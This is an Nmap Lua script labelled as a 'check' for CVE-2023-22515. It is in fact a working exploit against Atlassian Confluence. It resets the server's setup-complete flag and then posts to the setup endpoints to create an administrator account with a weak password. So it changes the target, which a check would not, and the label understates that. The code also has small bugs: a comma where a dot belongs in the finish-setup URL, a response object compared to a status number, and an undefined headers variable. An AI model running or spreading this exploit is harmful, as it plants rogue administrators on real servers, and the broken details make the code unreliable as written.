description = [[
CVE-2023-22515 Check
]]

categories = {"exploit" }

require("http")
local http = require 'http'

function portrule(host, port)
	return port.protocol == "tcp"
end

function action(host, port)
	local output = {}
	local result = false
	local act = http.get(host, port, '/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false')
	if act.status == 200 then
		
		local payload = {
			['username'] = 'admin',
			['fullName'] = 'admin',
			['email'] = 'kali@localhost.ru',
			['password'] = 'qwerty',
			['confirm'] = 'qwerty',
			['setup-next-button'] = 'Next',
		}
		local reg = http.post(host, port, '/setup/setupadministrator.action', headers, nil, payload)
		local server_output = http.post(host, port,'/setup/finishsetup,action', headers, nil, '')
		if reg.status == 302 and server_output == 200 then
			result = true
		
		end
	
	end
	

	if result then
		output[#output + 1] = "Success"
	else
		output[#output + 1] = "Unsuccess"
	end

	return output

end
